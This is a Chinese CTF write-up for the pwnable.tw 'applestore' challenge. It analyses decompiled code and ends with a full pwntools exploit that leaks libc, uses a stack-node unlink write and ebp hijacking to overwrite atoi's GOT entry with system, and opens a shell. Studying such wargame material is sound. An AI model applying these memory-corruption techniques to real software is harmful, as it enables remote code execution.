---
title: applestore
description: pwnable | ebp_hijacking | unlink
---
<!--more-->

## 题目考点

 - ebp劫持
 - 双向链表unlink实现任意地址写
 - \0截断

## 解题思路

  菜单题，进入ida分析，先看创建节点以及插入节点的函数:
```c
char **__cdecl create(int a1, char *a2)
{
  char **v2; // eax
  char **v3; // ST1C_4

  v2 = (char **)malloc(0x10u);
  v3 = v2;
  v2[1] = a2;
  asprintf(v2, "%s", a1);
  v3[2] = 0;
  v3[3] = 0;
  return v3;
}
int __cdecl insert(int a1)
{
  int result; // eax
  _DWORD *i; // [esp+Ch] [ebp-4h]

  for ( i = &myCart; i[2]; i = (_DWORD *)i[2] )
    ;
//遍历找到当前链表中最后一个节点
  i[2] = a1;
//i.fd = a1;
  result = a1;
  *(_DWORD *)(a1 + 12) = i;
//a1.bk = i;
  return result;
}
```
  可以看出myCart中是一个双向链表，结构如下:
```c
struct item{
	char* itemName;
	char* itemPrice;
	item* fd;
	item* bk;
}
```
  接下来寻找漏洞点，发现程序中使用my_read函数提供了类似read的功能，多次出现"只需要一个字节的地方read了0x15字节"的现象:
```c
printf("Let me check your cart. ok? (y/n) > ");
fflush(stdout);
my_read(&buf, 0x15u);
```
  如cart函数:
```c
int cart()
{
  signed int v0; // eax
  signed int v2; // [esp+18h] [ebp-30h]
  int v3; // [esp+1Ch] [ebp-2Ch]
  _DWORD *i; // [esp+20h] [ebp-28h]
  char buf; // [esp+26h] [ebp-22h]
  unsigned int v6; // [esp+3Ch] [ebp-Ch]

  v6 = __readgsdword(0x14u);
  v2 = 1;
  v3 = 0;
  printf("Let me check your cart. ok? (y/n) > ");
  fflush(stdout);
  my_read(&buf, 0x15u);
//为了程序正常运行，ebp-22h与ebp-21h的位置需要分别填入'y'与'\x00'
//栈中可以控制的地址范围为从 ebp-20h 开始 
  if ( buf == 121 )
  {
    puts("==== Cart ====");
    for ( i = (_DWORD *)dword_804B070; i; i = (_DWORD *)i[2] )
    {
      v0 = v2++;
      printf("%d: %s - $%d\n", v0, *i, i[1]);
      v3 += i[1];
    }
  }
  return v3;
}
```

  此外，还发现在checkout函数中存在条件判断:
```c
unsigned int checkout()
{
  int v1; // [esp+10h] [ebp-28h]
  char *v2; // [esp+18h] [ebp-20h]
  int v3; // [esp+1Ch] [ebp-1Ch]
  unsigned int v4; // [esp+2Ch] [ebp-Ch]

  v4 = __readgsdword(0x14u);
  v1 = cart();
  if ( v1 == 7174 )
  {
    puts("*: iPhone 8 - $1");
    asprintf(&v2, "%s", "iPhone 8");
    v3 = 1;
    insert(&v2);
    v1 = 7175;
  }
  printf("Total: $%d\n", v1);
  puts("Want to checkout? Maybe next time!");
  return __readgsdword(0x14u) ^ v4;
}
```
  这里的v2作为一个新建节点储存在栈中地址从ebp-0x20开始，观察其他函数: 当程序在handler函数中运行到cart()，checkout()，delete()等函数时，ebp是相同的，这也意味着在其他函数中也有机会修改ebp-0x20位置附近的值，达到修改iPhone8节点中fd、bk指针值的目的，进而可以达到泄露libc、unlink任意地址写的目的;
  另一方面来理解，此处的新增节点只是一个局部变量，可是程序却可以在退出该函数，局部变量失效的情况下再次访问这个节点，甚至可以理解为栈中的"UAF";
  回到delete的代码:
```c
unsigned int delete()
{
  signed int v1; // [esp+10h] [ebp-38h]
  _DWORD *v2; // [esp+14h] [ebp-34h]
  int v3; // [esp+18h] [ebp-30h]
  int v4; // [esp+1Ch] [ebp-2Ch]
  int v5; // [esp+20h] [ebp-28h]
  char nptr; // [esp+26h] [ebp-22h]
  unsigned int v7; // [esp+3Ch] [ebp-Ch]

  v7 = __readgsdword(0x14u);
  v1 = 1;
  v2 = (_DWORD *)dword_804B070;
  printf("Item Number> ");
  fflush(stdout);
  my_read(&nptr, 0x15u);
  v3 = atoi(&nptr);
  while ( v2 )
  {
    if ( v1 == v3 )
    {
      v4 = v2[2];
      v5 = v2[3];
      if ( v5 )
        *(_DWORD *)(v5 + 8) = v4;
      if ( v4 )
        *(_DWORD *)(v4 + 12) = v5;
      printf("Remove %d:%s from your shopping cart.\n", v1, *v2);
      return __readgsdword(0x14u) ^ v7;
    }
    ++v1;
    v2 = (_DWORD *)v2[2];
  }
  return __readgsdword(0x14u) ^ v7;
}
```
  看到unlink实现的代码，我们确实能修改某些地址上的内容，但是这个"某些地址"也是有条件的，倘若直接rop修改handler函数返回地址为system地址，那么delete函数会同时修改system函数中的内容，造成程序崩溃;
  综上，delete中的unlink不能以system函数为目标，故切换思路，寻找程序中读取输入的函数，劫持其参数，达到写入system函数地址到got表完成got hijacking的目的;
  观察handler函数的内容发现:
```c
char nptr; // [esp+16h] [ebp-22h]
my_read(&nptr, 0x15u);
switch ( atoi(&nptr) )
//...
```
  nptr, 即ebp-22h的地方可以利用，可以将handler函数的ebp劫持到got表atoi-22h的地方，nptr与atoi函数地址重叠，再读入system_addr 与 ";sh\x00"到该位置即可getshell;

## 利用思路

  首先通过简单的计算构建出能生成iPhone8节点的输入:
```py
for i in range(16):
	add(b'1')
for i in range(10):
	add(b'4')
checkout()
```
  接下来，进到cart()函数中，利用myread来覆盖ebp-0x20(iphone8.itemName)处为puts的got表地址，以此泄露libc地址，通过链表遍历的办法来获得栈上节点地址:
```py
def leakAddr(data):
	cart(data)
	p.recvuntil(b'27: ')
	return u32(p.recv(4))
items_start_at = 0x804B070
libc_base = leakAddr(p32(e.got['puts']) + p32(0)*3) - l.symbols['puts']
heap_base = leakAddr(p32(items_start_at) + p32(0)*3)
temp_addr = heap_base
for i in range(26):
	temp_addr = leakAddr(p32(temp_addr + 8) + p32(0)*3)
delet_ebp = temp_addr + 0x20

```
  delete函数中同样能修改栈上节点的内容，通过delete函数完成unlink实现任意地址写:
```py
payload1 = b'27'
payload1 += p32(0)*2 + p32(delet_ebp - 0x0c) + p32(e.got['atoi'] + 0x22)
delete(payload1)
```
  接下来handler函数会调用myread读入nptr，只需传入system及其参数就可以完成getshell了:
```py
p.recvuntil(b'>')
payload2 = p32(libc_base + l.symbols['system']) + b";sh\x00"
p.sendline(payload2)
```

## exploit
  完整代码:
```py
from pwn import *

p = remote("chall.pwnable.tw", 10104)
e = ELF("./applestore")
l = ELF("./libc_32.so.6")
context.log_level = 'debug'

def add(data):
	p.recvuntil(b'>')
	p.sendline(b'2')
	p.recvuntil(b'Device Number>')
	p.sendline(data)
def checkout():
	p.recvuntil(b'>')
	p.sendline(b'5')
	p.recvuntil(b'Let me check your cart. ok? (y/n) >')
	p.sendline(b'y\x00')
def cart(data):
	p.recvuntil(b'>')
	p.sendline(b'4')
	p.recvuntil(b'Let me check your cart. ok? (y/n) >')
	p.sendline(b'y\x00' + data)
def delete(data):
	p.recvuntil(b'>')
	p.sendline(b'3')
	p.recvuntil(b'Item Number>')
	p.sendline(data)
def leakAddr(data):
	cart(data)
	p.recvuntil(b'27: ')
	return u32(p.recv(4))
items_start_at = 0x804B070

for i in range(16):
	add(b'1')
for i in range(10):
	add(b'4')
checkout()

libc_base = leakAddr(p32(e.got['puts']) + p32(0)*3) - l.symbols['puts']
heap_base = leakAddr(p32(items_start_at) + p32(0)*3)
temp_addr = heap_base
for i in range(26):
	temp_addr = leakAddr(p32(temp_addr + 8) + p32(0)*3)
delet_ebp = temp_addr + 0x20

payload1 = b'27'
payload1 += p32(0)*2 + p32(delet_ebp - 0x0c) + p32(e.got['atoi'] + 0x22)
delete(payload1)

p.recvuntil(b'>')
payload2 = p32(libc_base + l.symbols['system']) + b";sh\x00"
p.sendline(payload2)

p.interactive()
```